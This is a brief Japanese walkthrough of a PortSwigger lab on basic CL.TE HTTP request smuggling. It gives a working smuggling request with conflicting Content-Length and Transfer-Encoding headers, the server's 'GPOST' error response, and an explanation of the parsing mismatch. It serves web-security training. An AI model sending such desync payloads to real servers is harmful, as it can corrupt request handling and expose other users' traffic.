# HTTP リクエストの密輸、基本的な CL.TE の脆弱性

次のハッキングラボを実施  
https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te  
このラボにはフロントエンド サーバーとバックエンド サーバーが含まれますが、フロントエンド サーバーはチャンク エンコーディングをサポートしていません。フロントエンド サーバーは、GET メソッドまたは POST メソッドを使用しないリクエストを拒否します。

- 1. BurpSuite を起動して Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 次のリクエストを 2 回送信すると、サーバーからレスポンスが返ってきます。http 1.1 で送信するには inspector で 1.1 を選択します。
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/64ab41c3-90a4-4255-9785-64be5669427f)

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

```
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```

フロントエンドサーバーは chenked に対応していないので、content-length 6 まで受けとろうとします。この時点で、要求はバックエンドに流されるようになります。バックエンドは最初のチャンクサイズが 0 だと理解しているため、G のみ受け取ります。これが次のリクエストに結合され、GPOST として扱われます。
